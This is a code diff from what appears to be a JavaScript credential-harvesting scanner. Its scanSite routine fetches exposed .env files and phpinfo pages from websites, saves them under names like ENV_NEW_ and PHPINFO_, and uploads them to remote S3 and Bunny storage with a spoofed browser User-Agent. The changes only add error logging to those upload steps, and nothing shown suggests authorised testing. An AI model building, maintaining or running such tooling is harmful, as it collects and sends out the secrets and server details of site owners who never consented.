@@ -131,8 +131,7 @@ async function uploadFileToS3(localPath, remotePath, maxRetries = 3) {
         Body: body
       }));
       log(`[S3 UPLOAD] OK: s3://${S3_BUCKET}/${s3key}`);
-      appendToS3Index(s3key).catch(() => {
-      });
+      appendToS3Index(s3key).catch((e) => log(`[S3 INDEX] Warning: ${e.message}`));
       return true;
     } catch (e) {
       const msg = e.message || String(e);
@@ -250,10 +249,8 @@ async function uploadLog() {
   } catch (_) {
     return;
   }
-  if (AWS_S3) uploadLogToS3().catch(() => {
-  });
-  if (BUNNY_STORAGE) uploadLogToBunny().catch(() => {
-  });
+  if (AWS_S3) await uploadLogToS3().catch((e) => log(`[LOG UPLOAD] S3 failed: ${e.message}`));
+  if (BUNNY_STORAGE) await uploadLogToBunny().catch((e) => log(`[LOG UPLOAD] Bunny failed: ${e.message}`));
 }
 var DEFAULT_HEADERS = {
   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -461,8 +458,7 @@ async function scanSite(siteLink, isFallback = false) {
           await fs.promises.writeFile(savedPath, `${res.config.url}
 ${content}`);
           const remote = `risultati/DATA_SPLIT/ENV_NEW_${suffix}.txt`;
-          uploadFile(savedPath, remote).catch(() => {
-          });
+          uploadFile(savedPath, remote).catch((e) => log(`  [ERR] Upload ENV failed: ${e.message}`));
           break;
         }
       }
@@ -588,8 +584,7 @@ ${content}`);
                       await fs.promises.writeFile(savedPath, `${item.url}
 ${formattedOutput}`);
                       const remote = `risultati/DATA_SPLIT/PHPINFO_${suffix}.txt`;
-                      uploadFile(savedPath, remote).catch(() => {
-                      });
+                      uploadFile(savedPath, remote).catch((e) => log(`  [ERR] Upload PHPINFO failed: ${e.message}`));
                     }
                   }
                 }
